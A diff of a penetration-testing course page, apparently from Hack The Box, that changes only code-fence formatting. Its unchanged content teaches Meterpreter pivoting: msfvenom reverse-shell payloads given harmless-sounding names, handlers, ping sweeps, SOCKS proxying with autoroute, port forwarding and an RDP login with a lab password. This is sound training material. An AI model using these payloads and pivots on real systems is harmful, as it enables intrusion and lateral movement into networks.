@@ -6,8 +6,7 @@ Now let us consider a scenario where we have our Meterpreter shell access on the
 
 #### Creating Payload for Ubuntu Pivot Host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
 
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -22,8 +21,7 @@ Before copying the payload over, we can start a [multi/handler](https://www.rapi
 
 #### Configuring & Starting the multi/handler
 
-```
-        shellsession
+```shellsession
 msf6 > use exploit/multi/handler
 
 [*] Using configured payload generic/shell_reverse_tcp
@@ -41,8 +39,7 @@ We can copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and 
 
 #### Executing the Payload on the Pivot Host
 
-```
-        shellsession
+```shellsession
 ubuntu@WebServer:~$ ls
 
 backupjob
@@ -54,8 +51,7 @@ We need to make sure the Meterpreter session is successfully established upon ex
 
 #### Meterpreter Session Establishment
 
-```
-        shellsession
+```shellsession
 [*] Sending stage (3020772 bytes) to 10.129.202.64
 [*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
 meterpreter > pwd
@@ -67,8 +63,7 @@ We know that the Windows target is on the 172.16.5.0/23 network. So assuming tha
 
 #### Ping Sweep
 
-```
-        shellsession
+```shellsession
 meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
 
 [*] Performing ping sweep for IP range 172.16.5.0/23
@@ -78,22 +73,19 @@ We could also perform a ping sweep using a `for loop` directly on a target pivot
 
 #### Ping Sweep For Loop on Linux Pivot Hosts
 
-```
-        shellsession
+```shellsession
 for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
 ```
 
 #### Ping Sweep For Loop Using CMD
 
-```
-        cmd
+```bat
 for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
 ```
 
 #### Ping Sweep Using PowerShell
 
-```
-        powershell
+```powershell
 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
 ```
 
@@ -103,8 +95,7 @@ There could be scenarios when a host's firewall blocks ping (ICMP), and the ping
 
 #### Configuring MSF's SOCKS Proxy
 
-```
-        shellsession
+```shellsession
 msf6 > use auxiliary/server/socks_proxy
 
 msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
@@ -137,8 +128,7 @@ Auxiliary action:
 
 #### Confirming Proxy Server is Running
 
-```
-        shellsession
+```shellsession
 msf6 auxiliary(server/socks_proxy) > jobs
 
 Jobs
@@ -153,8 +143,7 @@ After initiating the SOCKS server, we will configure proxychains to route traffi
 
 #### Adding a Line to proxychains.conf if Needed
 
-```
-        shellsession
+```shellsession
 socks4  127.0.0.1 9050
 ```
 
@@ -164,8 +153,7 @@ Finally, we need to tell our socks\_proxy module to route all the traffic via ou
 
 #### Creating Routes with AutoRoute
 
-```
-        shellsession
+```shellsession
 msf6 > use post/multi/manage/autoroute
 
 msf6 post(multi/manage/autoroute) > set SESSION 1
@@ -185,8 +173,7 @@ msf6 post(multi/manage/autoroute) > run
 
 It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
 
-```
-        shellsession
+```shellsession
 meterpreter > run autoroute -s 172.16.5.0/23
 
 [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
@@ -200,8 +187,7 @@ After adding the necessary route(s) we can use the `-p` option to list the activ
 
 #### Listing Active Routes with AutoRoute
 
-```
-        shellsession
+```shellsession
 meterpreter > run autoroute -p
 
 [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
@@ -221,8 +207,7 @@ As you can see from the output above, the route has been added to the 172.16.5.0
 
 #### Testing Proxy & Routing Functionality
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -253,8 +238,7 @@ Port forwarding can also be accomplished using Meterpreter's `portfwd` module. W
 
 #### Portfwd options
 
-```
-        shellsession
+```shellsession
 meterpreter > help portfwd
 
 Usage: portfwd [-h] [add | delete | list | flush] [args]
@@ -272,8 +256,7 @@ OPTIONS:
 
 #### Creating Local TCP Relay
 
-```
-        shellsession
+```shellsession
 meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 
 [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
@@ -283,8 +266,7 @@ The above command requests the Meterpreter session to start a listener on our at
 
 #### Connecting to Windows Target through localhost
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
 ```
 
@@ -292,8 +274,7 @@ hiimeins@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
 
 We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netstat -antp
 
 tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp
@@ -309,8 +290,7 @@ We can create a reverse port forward on our existing shell from the previous sce
 
 #### Reverse Port Forwarding Rules
 
-```
-        shellsession
+```shellsession
 meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 
 [*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
@@ -318,8 +298,7 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 
 #### Configuring & Starting multi/handler
 
-```
-        shellsession
+```shellsession
 meterpreter > bg
 
 [*] Backgrounding session 1...
@@ -338,8 +317,7 @@ We can now create a reverse shell payload that will send a connection back to ou
 
 #### Generating the Windows Payload
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -354,8 +332,7 @@ Finally, if we execute our payload on the Windows host, we should be able to rec
 
 #### Establishing the Meterpreter session
 
-```
-        shellsession
+```shellsession
 [*] Started reverse TCP handler on 0.0.0.0:8081 
 [*] Sending stage (200262 bytes) to 10.10.14.18
 [*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
